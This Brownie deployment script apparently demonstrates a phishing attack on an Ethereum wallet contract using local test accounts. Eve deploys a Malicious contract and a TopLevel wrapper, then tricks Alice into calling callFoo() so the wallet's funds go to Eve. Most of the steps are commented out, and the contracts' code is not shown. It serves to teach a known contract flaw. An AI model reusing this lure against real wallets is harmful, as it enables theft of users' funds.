from brownie import Wallet, TopLevel, Foo, Malicious, accounts, web3


def main():

    # Starting balance is 100 eth for both Alice and Eve

    # Alice's transactions
    alice_good_personal = accounts[1]
    alice_deposit_amt = "5 ether"
    alice_wallet = Wallet.deploy({"from": alice_good_personal, "value": alice_deposit_amt})

    # Eve's transactions - she knows Alice's "wallet contract" address
    eve_bad_personal = accounts[0]
    mal = Malicious.deploy(alice_wallet, {"from": eve_bad_personal})
    top_level_bad = TopLevel.deploy(mal, {"from": eve_bad_personal})

    ### print  Alice's wallet contract balance
    #print(f"Alice's contract balance: {web3.fromWei(alice_wallet.balance(), 'ether')} ether")
    #print(f"Alice's personal balance: {web3.fromWei(alice_good_personal.balance(), 'ether')} ether")

    ### Eve attempts to withdraw and fails ###

    #tx_will_revert = alice_wallet.transfer(eve_bad_personal, alice_wallet.balance(), {"from": eve_bad_personal})

    ### Alice withdraws succesfully ###

    #print(f"Alice's contract balance: {web3.fromWei(alice_wallet.balance(), 'ether')} ether")
    #print(f"Alice's personal balance: {web3.fromWei(alice_good_personal.balance(), 'ether')} ether")

    #tx_alice_success = alice_wallet.transfer(alice_good_personal, alice_wallet.balance(), {"from": alice_good_personal})

    #print(f"Alice's contract balance: {web3.fromWei(alice_wallet.balance(), 'ether')} ether")
    #print(f"Alice's personal balance: {web3.fromWei(alice_good_personal.balance(), 'ether')} ether")

    ### Eve executes a successful phishing attack by tricking Alice to call callFoo() in TopLevel ###

    #print(f"Alice's contract balance: {web3.fromWei(alice_wallet.balance(), 'ether')} ether")
    #print(f"Eve's personal balance: {web3.fromWei(eve_bad_personal.balance(), 'ether')} ether")
    #print(f"Alice's personal balance: {web3.fromWei(alice_good_personal.balance(), 'ether')} ether")

    #tx_alice_gets_phished = top_level_bad.callFoo({"from": alice_good_personal})

    #print(f"Alice's contract balance: {web3.fromWei(alice_wallet.balance(), 'ether')} ether")
    #print(f"Alice's personal balance: {web3.fromWei(alice_good_personal.balance(), 'ether')} ether")
    #print(f"Eve's personal balance: {web3.fromWei(eve_bad_personal.balance(), 'ether')} ether")
    #print(tx_alice_gets_phished.info())


